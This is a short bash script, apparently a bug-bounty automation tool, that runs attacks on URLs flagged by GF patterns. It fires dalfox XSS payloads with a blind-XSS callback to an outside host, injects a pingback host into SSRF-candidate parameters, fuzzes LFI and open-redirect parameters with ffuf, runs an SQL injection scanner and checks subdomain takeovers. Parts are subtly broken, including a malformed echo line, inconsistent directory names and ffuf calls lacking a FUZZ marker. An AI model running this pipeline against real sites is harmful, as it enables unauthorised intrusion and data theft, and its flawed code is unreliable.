

#!/bin/bash
# By Mercurial
## Automated GF && GF-patterns 


echo "Ola SrMercurial"


mkdir "Scans"
echo"pingd"
read pingd
# Use GF to identify "suspicious" endpoints that may be vulnerable (automatic checks below)
{
dalfox file Gf_files/xss.txt -b https://hijusttesting.xss.ht -o xss_Results.txt
dalfox file Gf_files/xss.txt | uro | dalfox pipe --deep-domxss --multicast --blind https://hijusttesting.xss.ht
dalfox file Gf_files/xss.txt --custom-payload /home/water/WordLists/XSS/xss_payload.txt -o xss_Results2.txt
} &> /dev/null

cat "Gf_files/ssrf.txt" | qsreplace $pingd | anew ssrftry.txt
cat ssrftry.txt | httpx -silent 

cat  "Gf_files/lfi.txt" | while read url; do ffuf -w /home/water/WordLists/lfi.txt -u $url -t 45 -o Scans/lfi.txt ; done

cat "Gf_files/sqli.txt" | python3 /home/water/tools/DSSS/dsss.py | anew Scans/SqliResults.txt

cat "Gf_files/openredirect.txt" | while read url; do ffuf -w /home/water/WordLists/openredirect.txt -u $url -mc 302 -t 45 -o Scans/open_redirect.txt ; done

cd GF_files
if [ -s takeovers.txt ]
then
subzy -targets takeovers.txt | anew Takeovers.txt
else
rm takeovers.txt
fi
cd ..


echo "Esta feito SrMercurial! XSS;Open-Redirects e Takeovers"




